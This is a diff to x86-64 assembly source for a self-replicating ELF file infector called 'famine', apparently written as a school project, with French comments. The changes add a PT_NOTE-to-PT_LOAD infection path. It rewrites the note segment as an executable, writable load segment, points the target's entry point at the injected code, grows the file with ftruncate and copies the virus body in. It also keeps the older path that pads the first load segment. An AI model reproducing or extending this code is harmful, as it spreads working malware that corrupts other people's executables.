@@ -26,6 +26,10 @@ get_file_data:
     
     xor rdi, rdi
     mov rsi, [r12 + fileSize]
+    shr rsi, 12                             ; 12 bits = 4096
+    shl rsi, 12
+    add rsi, 4096                           ; align 4096
+    add rsi, PROG_SIZE
     mov rdx, PROT_READ | PROT_WRITE
     mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
     mov r8, [r12 + fd]
@@ -97,57 +101,120 @@ get_file_entry:                     ; recupere l'entry point de l'executable
     
 
 get_first_pload:
-    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
-    xor r14, r14                  ; mise a 0
-    xor rdi, rdi
-    mov di, [r13 + e_phnum]
-    mov rsi, [r13 + e_phoff]
-    xor rdx, rdx
-    mov dx, [r13 + e_phentsize]
-    xor rax, rax
+    mov rsi, [r12 + fileData]     ; rsi = famine->filedata;
+    xor rax, rax                  ; rax = p_type
+    xor rbx, rbx                  ; rbx = n of pload
+    xor rcx, rcx                  ; rcx = nb of pload
+    xor rdx, rdx                  ; rdx = size of a pload
+    mov rdi, rsi
+    add rdi, [rsi + e_phoff]      ; rdi = pheader address
+
+    mov [r12 + pload], rax
+    mov [r12 + ptnote], rax       ; set pload and ptnote value to 0
+    mov cx, [rsi + e_phnum]
+    mov dx, [rsi + e_phentsize]
+
 phead_loop:
-    mov eax, [r13 + rsi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
+    mov eax, [rdi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
     cmp eax, PT_LOAD
-    jz first_pload_found
-    inc r14
-    add rsi, rdx
-    cmp r14, rdi
+    jnz no_pload_found
+    cmp qword [r12 + pload], 0
+    jnz first_pload_found
+    mov [r12 + pload], rdi
+    first_pload_found:
+    mov [r12 + lastPload], rdi
+    no_pload_found:
+    cmp eax, PT_NOTE
+    jnz no_pt_note_found
+    mov [r12 + ptnote], rdi
+    no_pt_note_found:
+    inc rbx
+    add rdi, rdx
+    cmp rbx, rcx
     jl phead_loop
-    jmp close_mmap                    ;on quite si il n'y a pas de pload trouvé
-first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
-    add r13, rsi
-    mov [r12 + pload], r13
+    cmp qword [r12 + pload], 0
+    jz close_mmap                    ;on quite si il n'y a pas de pload trouvé
+
 check_pload_size:
+    mov r13, [r12 + pload]
+    mov rax, [r13 + p_filesz]
+    add rax, PROG_SIZE
+    mov rdi, [r12 + fileSize]
+    cmp rdi, rax
+    jl simple                               ; si le pload + le programe est plus grand que le fichier
     xor rdx, rdx
     mov rax, [r13 + p_filesz]
     mov rdi, [r13 + p_align]
     div rdi
     sub rdi, rdx
     cmp rdi, PROG_SIZE                      ; regarde si on a assez de place dans le bourrage et fait un simple append de la signature si on a pas assez
-    jl simple
-    mov rax, [r13 + p_filesz]
-    add rax, PROG_SIZE
-    mov rdi, [r12 + fileSize]
-    cmp rdi, rax
-    jl simple                               ; si le pload + le programe est plus grand que le fichier
+    jge write_virus_entry
+    cmp qword [r12 + ptnote], 0             ; check if a ptnote has been found and just add a signature if there is none
+    jz simple
 
+create_new_pload:
+    mov rax, [r12 + lastPload]
+    mov rbx, [rax + p_vaddr]
+    add rbx, [rax + p_memsz]                ; address in memory not used
+    shr rbx, 12                             ; 12 bits = 4096
+    shl rbx, 12
+    add rbx, 4096                           ; align 4096
+    mov [r12 + entry], rbx                  ; asign entry point 
+    mov rdx, [r12 + fileData]
+    mov [rdx + e_entry], rbx
+    mov rcx, [r12 + fileSize]               ; end of the file
+    shr rcx, 12                             ; 12 bits = 4096
+    shl rcx, 12
+    add rcx, 4096                           ; align 4096
+    mov [r12 + programStart], rcx
+    mov rax, [r12 + ptnote]
+    mov [rax + p_offset], rcx
+    mov [rax + p_vaddr], rbx
+    mov [rax + p_paddr], rbx
+    mov rbx, PROG_SIZE                      ; size of the program
+    mov [rax + p_filesz], rbx
+    mov [rax + p_memsz], rbx
+    mov rbx, 4096                           ; allignement
+    mov [rax + p_align], rbx
+    mov ebx, PT_LOAD
+    mov [rax + p_type], ebx
+    mov ebx, PF_X | PF_W | PF_R
+    mov [rax + p_flags], ebx
+    mov [r12 + pload], rax                  ; change the pload with the modified ptnote
+    add rcx, PROG_SIZE
+    mov [r12 + fileSize], rcx
+    mov rdi, [r12 + fd]
+    mov rsi, rcx
+    mov rax, SYS_FTRUNCATE
+    syscall
+    jmp copy_program
 
 write_virus_entry:
     mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
     add rdi, [r13 + p_memsz]
     mov [r12 + entry], rdi
     mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
-    mov [rsi + e_entry], rdi
+    mov [rsi + e_entry], rdi               
+    mov rax, [r13 + p_filesz]           ; offset a la fin du premier pload
+    mov [r12 + programStart], rax
+
+change_pload_data:
+    ; augmente la taille du premier pload
+    add qword [r13 + p_memsz], PROG_SIZE
+    add qword [r13 + p_filesz], PROG_SIZE
+    
+    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
+    or dword [r13 + p_flags], PF_W           ; ajoute les droit d'execution
 
 
 copy_program:
-    mov rdi, [r12 + fileData]               ; address a la fin du premier pload
-    add rdi, [r13 + p_filesz]
+    mov rdi, [r12 + fileData]
+    add rdi, [r12 + programStart]           ; address to write the programe in the file
     mov rbx, rdi
     lea rsi, [rel main]                     ; address du debut du programe
     mov rcx, PROG_SIZE                      ; taille du programe
     rep movsb
-    
+
     ; calcule le jump qu'il faut faire pour attendre l'entry normale 
     mov rdx, [r12 + entry]
     add rdx, JMP_OFFSET + 5
